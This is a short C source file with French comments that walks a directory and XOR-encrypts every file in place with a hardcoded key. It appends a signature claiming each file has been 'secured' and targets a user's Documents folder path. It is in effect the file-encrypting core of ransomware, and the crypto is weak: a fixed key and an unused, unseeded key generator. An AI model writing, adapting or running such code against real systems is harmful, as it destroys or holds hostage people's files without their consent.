#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <dirent.h>
#include "fonction.h"

#define SIGNATURE "Ce fichier a bien été sécurisé aujourd'hui"

// Fonction utilitaire pour vérifier si un chemin est un fichier régulier
int isRegularFile(const char *path) {
    struct stat pathStat;
    if (stat(path, &pathStat) != 0) {
        perror("Error retrieving file info");
        return 0;
    }
    return S_ISREG(pathStat.st_mode);
}

// Fonction pour afficher les erreurs
void logError(const char *message) {
    fprintf(stderr, "ERROR: %s\n", message);
}

// Fonction pour générer une clé de chiffrement simple
void generateEncryptionKey(char *keyBuffer, size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (size_t i = 0; i < length - 1; i++) {
        keyBuffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    keyBuffer[length - 1] = '\0'; // Terminaison de la chaîne
}

// Liste les fichiers dans un répertoire
void listFiles() {
    struct dirent *dir;
    DIR *d = opendir("C:\\Users\\user1\\OneDrive\\PC-Perso\\Documents");
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            printf("%s\n", dir->d_name);
        }
        closedir(d);
    }
}

// Ajoute une signature et chiffre un fichier
void encryptFile(const char *filename, const char *key) {
    if (!isRegularFile(filename)) {
        logError("The specified path is not a regular file.");
        return;
    }

    FILE *file = fopen(filename, "a+");
    if (!file) {
        perror("Error opening file for encryption");
        return;
    }

    // Ajoute la signature au fichier
    fprintf(file, "\n%s\n", SIGNATURE);

    // Exemple de chiffrement basique (XOR avec une clé)
    fseek(file, 0, SEEK_SET);
    char buffer[1024];
    size_t bytesRead;
    FILE *tempFile = tmpfile();
    if (!tempFile) {
        perror("Error creating temporary file");
        fclose(file);
        return;
    }

    while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        for (size_t i = 0; i < bytesRead; i++) {
            buffer[i] ^= key[i % strlen(key)]; // Chiffrement XOR simple
        }
        fwrite(buffer, 1, bytesRead, tempFile);
    }

    freopen(filename, "w", file);
    rewind(tempFile);
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), tempFile)) > 0) {
        fwrite(buffer, 1, bytesRead, file);
    }

    fclose(tempFile);
    fclose(file);

    printf("File %s has been encrypted.\n", filename);
}

// Parcourt un répertoire et chiffre tous les fichiers qu'il contient
void encryptFiles(const char *directory) {
    struct dirent *dir;
    DIR *d = opendir(directory);
    if (!d) {
        perror("Error opening directory");
        return;
    }

    char filepath[1024];
    while ((dir = readdir(d)) != NULL) {
        if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0) {
            snprintf(filepath, sizeof(filepath), "%s\\%s", directory, dir->d_name);

            encryptFile(filepath, "my_secret_key");
        }
    }
    closedir(d);
}
